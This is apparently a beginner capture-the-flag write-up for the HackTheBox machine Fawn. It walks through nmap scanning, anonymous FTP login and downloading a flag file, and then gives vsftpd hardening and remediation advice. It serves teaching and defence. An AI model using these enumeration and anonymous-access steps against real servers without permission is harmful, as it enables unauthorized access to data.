# Fawn - HackTheBox Starting Point (Tier 0)

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Player](https://img.shields.io/badge/Player%20%23-437600-9FEF00)

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | Fawn |
| **Difficulty** | Very Easy |
| **OS** | Linux |
| **Release Date** | 30 September 2021 |
| **Creator** | HTB-Bot |
| **Type** | Starting Point - Tier 0 |
| **Points** | 0 |
| **Rating** | 4.8/5 (135 votes) |

## Synopsis

Fawn is the second machine in HackTheBox's Starting Point series (Tier 0). This beginner-friendly Linux machine focuses on **FTP (File Transfer Protocol)** fundamentals, teaching essential concepts about service enumeration, anonymous authentication vulnerabilities, and basic file transfer operations.

## Learning Objectives

By completing this machine, you will learn:
- 🔍 **FTP Protocol Fundamentals** - Understanding port 21 and FTP architecture
- 🔓 **Anonymous Authentication** - Exploiting misconfigured FTP servers
- 📂 **File Transfer Operations** - Using FTP commands to navigate and download files
- 🛠️ **Service Enumeration** - Identifying service versions with nmap
- 🚨 **Security Implications** - Understanding why anonymous FTP is a security risk

## Skills Required

- Basic Linux command-line knowledge
- Understanding of networking concepts
- Familiarity with TCP/IP protocols

## Skills Learned

- FTP client usage
- Service version detection
- Anonymous login exploitation
- Basic penetration testing methodology

---

## Guided Mode - Task Walkthrough

Fawn includes 11 guided tasks that teach FTP fundamentals before flag submission.

### Task 1: What does the 3-letter acronym FTP stand for?

**Answer:** File Transfer Protocol

**Explanation:**
FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and server on a computer network. It operates on:
- **Port 21** for command/control
- **Port 20** for data transfer (in active mode)

FTP has been around since 1971 and is one of the oldest application protocols still in use today.

---

### Task 2: Which port does the FTP service listen on usually?

**Answer:** 21

**Explanation:**
FTP uses **TCP port 21** for its control connection. This is where commands like `USER`, `PASS`, `LIST`, and `RETR` are sent. The actual data transfer can occur on port 20 (active mode) or dynamically assigned ports (passive mode).

---

### Task 3: What acronym is used for a secure FTP protocol extension over SSH?

**Answer:** SFTP

**Explanation:**
**SFTP (SSH File Transfer Protocol)** provides secure file transfer capabilities. Unlike FTP:
- ✅ SFTP encrypts both commands and data
- ✅ Uses SSH (port 22) for authentication
- ✅ Provides integrity checking
- ❌ FTP sends credentials in cleartext
- ❌ FTP data is unencrypted

Other secure alternatives include:
- **FTPS** (FTP over SSL/TLS)
- **SCP** (Secure Copy Protocol)

---

### Task 4: What command do we use to test connectivity (ICMP echo request)?

**Answer:** ping

**Explanation:**
Before attacking a target, verify network connectivity:

```bash
ping <target_ip>
```

This sends ICMP Echo Request packets and waits for Echo Reply responses.

---

### Task 5: From your scans, what version is FTP running on the target?

**Answer:** vsftpd 3.0.3

**Command:**
```bash
nmap -sV -p 21 <target_ip>
```

**Explanation:**
The `-sV` flag enables version detection. Output shows:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

**vsftpd** (Very Secure FTP Daemon) is a popular FTP server for Unix-like systems, known for:
- Security-focused design
- High performance
- Simple configuration

---

### Task 6: From your scans, what OS type is running on the target?

**Answer:** Unix

**Command:**
```bash
nmap -O <target_ip>
```

Or check the service banner from the previous scan:

```
Service Info: OS: Unix
```

---

### Task 7: What command displays the 'ftp' client help menu?

**Answer:** ftp -?

**Usage:**
```bash
ftp -?
# or
ftp --help
# or
man ftp
```

This displays available options and syntax for the FTP client.

---

### Task 8: What username is used for anonymous FTP login?

**Answer:** anonymous

**Explanation:**
Many FTP servers allow **anonymous login** for public file sharing. To connect anonymously:
- **Username:** `anonymous`
- **Password:** Any email address (or just press Enter)

This is a **major security misconfiguration** when applied to servers containing sensitive data.

---

### Task 9: What is the response code for 'Login successful'?

**Answer:** 230

**Explanation:**
FTP uses numeric response codes similar to HTTP:

| Code | Meaning |
|------|---------|
| **230** | User logged in, proceed |
| **331** | Username okay, need password |
| **530** | Not logged in |
| **220** | Service ready for new user |

After successful anonymous login, you'll see:
```
230 Login successful.
```

---

### Task 10: What FTP command lists files and directories?

**Answer:** ls

**Alternative:** `dir`

**Explanation:**
Once logged into FTP, use standard Unix commands:

```bash
ftp> ls          # List files
ftp> pwd         # Print working directory
ftp> cd <dir>    # Change directory
```

---

### Task 11: What command downloads a file from the FTP server?

**Answer:** get

**Usage:**
```bash
ftp> get flag.txt      # Download single file
ftp> mget *.txt        # Download multiple files
```

---

## Exploitation Methodology

### Phase 1: Reconnaissance

#### 1.1 Host Discovery
```bash
# Verify target is reachable
ping -c 4 <target_ip>
```

#### 1.2 Port Scanning
```bash
# Quick scan of all ports
nmap -p- --min-rate=1000 <target_ip>

# Detailed scan of discovered ports
nmap -sC -sV -p 21 <target_ip>
```

**Expected Output:**
```
Starting Nmap 7.94SVN
Nmap scan report for <target_ip>
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<your_ip>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

**Key Findings:**
- ✅ FTP service running on port 21
- ✅ vsftpd version 3.0.3
- ⚠️ **Anonymous login enabled** (Critical vulnerability!)
- ⚠️ flag.txt file visible

---

### Phase 2: Enumeration

#### 2.1 Connect to FTP Server

```bash
ftp <target_ip>
```

**Login Prompt:**
```
Connected to <target_ip>.
220 (vsFTPd 3.0.3)
Name (<target_ip>:user): anonymous
331 Please specify the password.
Password: [press Enter]
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

#### 2.2 Explore FTP Server

```bash
ftp> pwd
257 "/" is the current directory

ftp> ls
229 Entering Extended Passive Mode (|||port|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> ls -la
# Shows all files including hidden ones
```

---

### Phase 3: Exploitation

#### 3.1 Download the Flag File

```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||port|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32      100.00 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (1.23 KiB/s)
```

#### 3.2 Exit FTP Session

```bash
ftp> bye
221 Goodbye.
```

#### 3.3 Read the Flag

```bash
cat flag.txt
```

**Output:** (flag content redacted for educational purposes)

---

## Alternative Methods

### Method 1: One-liner FTP Command

```bash
ftp -n <target_ip> << EOF
user anonymous ""
ls
get flag.txt
bye
EOF

cat flag.txt
```

### Method 2: Using wget

```bash
wget ftp://anonymous:@<target_ip>/flag.txt

cat flag.txt
```

### Method 3: Using curl

```bash
curl ftp://anonymous:@<target_ip>/flag.txt
```

### Method 4: Using lftp (Advanced)

```bash
lftp -u anonymous, <target_ip>
lftp anonymous@<target_ip>:~> get flag.txt
lftp anonymous@<target_ip>:~> quit
```

---

## Security Implications

### Why Anonymous FTP is Dangerous

1. **No Authentication Required**
   - Anyone can access the server
   - No audit trail of who accessed what

2. **Information Disclosure**
   - Sensitive files may be exposed
   - Directory structure revealed
   - System information leaked

3. **Potential for Upload**
   - If write permissions exist, attackers can:
     - Upload malware
     - Deface content
     - Create backdoors

4. **Cleartext Protocol**
   - All traffic is unencrypted
   - Credentials visible on the network
   - Data can be intercepted

### Real-World Impact

Anonymous FTP servers have been involved in:
- **Data breaches** - Exposed customer databases
- **Malware distribution** - Used as staging grounds
- **Compliance violations** - GDPR, HIPAA, PCI-DSS fines

---

## Remediation

### Securing FTP Servers

#### 1. Disable Anonymous Login

Edit `/etc/vsftpd.conf`:
```bash
anonymous_enable=NO
```

#### 2. Use Strong Authentication

```bash
local_enable=YES
write_enable=NO
chroot_local_user=YES
```

#### 3. Implement SSL/TLS (FTPS)

```bash
ssl_enable=YES
rsa_cert_file=/etc/ssl/certs/vsftpd.pem
rsa_private_key_file=/etc/ssl/private/vsftpd.key
force_local_data_ssl=YES
force_local_logins_ssl=YES
```

#### 4. Migrate to SFTP

Replace FTP entirely with SFTP:
```bash
# Configure SSH for SFTP-only access
Subsystem sftp /usr/lib/openssh/sftp-server

Match Group sftponly
    ChrootDirectory /home/%u
    ForceCommand internal-sftp
    AllowTcpForwarding no
```

#### 5. Monitoring and Logging

```bash
# Enable logging
xferlog_enable=YES
xferlog_file=/var/log/vsftpd.log

# Monitor with fail2ban
[vsftpd]
enabled = true
port = ftp
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 3
```

---

## FTP Command Reference

### Navigation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ls` | List files | `ls -la` |
| `cd` | Change directory | `cd /pub` |
| `pwd` | Print working directory | `pwd` |
| `lcd` | Change local directory | `lcd /tmp` |

### Transfer Commands

| Command | Description | Example |
|---------|-------------|---------|
| `get` | Download single file | `get file.txt` |
| `mget` | Download multiple files | `mget *.pdf` |
| `put` | Upload single file | `put upload.zip` |
| `mput` | Upload multiple files | `mput *.jpg` |

### Session Commands

| Command | Description | Example |
|---------|-------------|---------|
| `binary` | Set binary transfer mode | `binary` |
| `ascii` | Set ASCII transfer mode | `ascii` |
| `passive` | Enable passive mode | `passive` |
| `bye` / `quit` | Exit FTP session | `bye` |
| `help` | Show available commands | `help` |

---

## Tools Used

### Primary Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **nmap** | Port scanning & service detection | `nmap -sV -sC <ip>` |
| **ftp** | FTP client | `ftp <ip>` |
| **cat** | Read file contents | `cat flag.txt` |

### Alternative Tools

- **lftp** - Advanced FTP client with scripting
- **FileZilla** - GUI FTP client
- **wget** - Command-line file retriever
- **curl** - Transfer data from/to servers

---

## Key Takeaways

### Technical Lessons

✅ **FTP Basics**
- FTP operates on port 21 (control) and port 20 (data)
- vsftpd is a common Unix FTP server
- Anonymous login is `anonymous` with any/no password

✅ **Security Awareness**
- Anonymous FTP is a critical misconfiguration
- FTP transmits data in cleartext
- SFTP/FTPS should be used instead

✅ **Enumeration Skills**
- nmap can detect anonymous FTP access
- Service version information aids vulnerability research
- Always enumerate before exploiting

### Penetration Testing Methodology

1. **Reconnaissance** → Identify target and gather information
2. **Scanning** → Find open ports and services
3. **Enumeration** → Determine service versions and configurations
4. **Exploitation** → Leverage misconfigurations or vulnerabilities
5. **Post-Exploitation** → Extract data and maintain access

---

## Additional Resources

### FTP Security

- [NIST SP 800-52 Rev. 2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r2.pdf) - TLS Guidelines
- [CWE-306: Missing Authentication](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP Insecure Authentication](https://owasp.org/www-community/vulnerabilities/Insecure_Authentication)

### vsftpd Documentation

- [vsftpd Official Site](https://security.appspot.com/vsftpd.html)
- [vsftpd Configuration Guide](https://security.appspot.com/vsftpd/vsftpd_conf.html)

### FTP Protocol

- [RFC 959 - FTP Protocol](https://www.ietf.org/rfc/rfc959.txt)
- [RFC 4217 - FTP over SSL/TLS](https://www.ietf.org/rfc/rfc4217.txt)
- [RFC 2228 - FTP Security Extensions](https://www.ietf.org/rfc/rfc2228.txt)

---

## Machine Statistics

- **Completed:** 04 January 2026
- **Player Number:** #437600
- **Time to Root:** ~15 minutes
- **Difficulty Rating:** ⭐ (Very Easy)
- **User Owns:** 437,600+
- **System Owns:** 437,600+

---

## Next Steps

After completing Fawn, continue with:

### Starting Point - Tier 0
- ✅ Meow (Telnet exploitation)
- ✅ **Fawn** (FTP anonymous login) ← You are here
- ⏭️ Dancing (SMB enumeration)
- 🔒 Redeemer (Redis exploitation)
- 🔒 Explosion (RDP brute force)
- 🔒 Preignition (Web directory enumeration)
- 🔒 Mongod (MongoDB exploitation)
- 🔒 Synced (Rsync misconfiguration)

### Recommended Learning Path

1. Complete all Tier 0 machines
2. Move to Tier 1 for intermediate challenges
3. Practice similar boxes on:
   - VulnHub
   - TryHackMe (Network Services room)
   - PentesterLab

---

## Acknowledgments

- **Creator:** HTB-Bot
- **Platform:** HackTheBox
- **Release Date:** 30 September 2021
- **Writeup Author:** Salim Hadda
- **Date Completed:** 04 January 2026

---

**⚠️ Disclaimer:** This writeup is for educational purposes only. Only practice these techniques on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

**🔒 Happy Hacking & Stay Ethical!**
